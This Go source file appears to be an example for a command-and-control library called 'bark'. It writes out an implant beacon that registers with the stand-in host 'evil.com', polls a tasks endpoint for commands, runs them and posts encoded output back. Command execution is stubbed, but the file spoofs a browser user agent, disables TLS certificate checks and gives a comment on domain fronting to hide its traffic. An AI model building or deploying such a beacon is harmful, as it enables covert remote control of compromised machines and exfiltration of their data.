package main

import (
	"encoding/base64"
	"fmt"
	"time"

	"github.com/salukikit/bark"
)

func RunCmd(cmd string) string {

	fmt.Println(cmd)
	return "Task run!"

}

func YourDecryptFunc(respbody []byte) (string, bool) {
	return string(respbody), true

}

func YourEncryptFunc(output []byte) (string, bool) {
	return base64.StdEncoding.EncodeToString(output), true

}

func main() {

	var reg bool

	verifycert := false

	/*
		The next line creates a simple default http transport, with tls verify skipped.
		Both NewBarkerQUIC and NewBarkerHTTP just create an easy default *BarkerConfig, you can manually specify everything yourself with your own *bark.BarkerConfig
	*/
	mybarker := bark.NewBarkerHTTP("mynewhttpcomms", verifycert)
	mybarker.Ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"

	//root url should include the protocol, e.g. http:// or https://

	rooturl := "https://evil.com"

	/*
		You can also manually specify Transport config etc via the .tr field like so:

			mybarker.tr = &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					ServerName: "cloudfront.com",
				},
				Proxy:           http.ProxyFromEnvironment,
			}
		This can be useful for things like domain fronting, where you might need to manually specify the SNI header, or if you have really specific TLS needs.
	*/

	for !reg {

		regurl := rooturl + "/register"
		resp, err := mybarker.Beacon(regurl)
		if err != nil {
			time.Sleep(1000)
			return
		}

		//do your decryption/verification, maybe get some fancy new urls after registering, it's all up to you!
		ua, ok := YourDecryptFunc(resp)
		if ok {
			//Registered! Below could be a way of updating the user-agent or whatever you like with a new user-agent.
			mybarker.Ua = ua
			reg = true
		}

	}

	//Now we start the beacon loop
	for {

		beaconurl := rooturl + "/tasks"
		posturl := rooturl + "/tasks/"

		encCmd, err := mybarker.Beacon(beaconurl)
		if err != nil {
			time.Sleep(1000)
			return
		}
		cmd, ok := YourDecryptFunc(encCmd)
		if ok {

			//Command is good, run command
			output := RunCmd(cmd)
			encdata, ok := YourEncryptFunc([]byte(output))
			if ok {
				taskid := "123" //TaskID is usually sent in the path after the tasks url e.g. /tasks/123
				mybarker.PostOutput(posturl+taskid, []byte(encdata))
			}

		}
		time.Sleep(1000)
	}
}
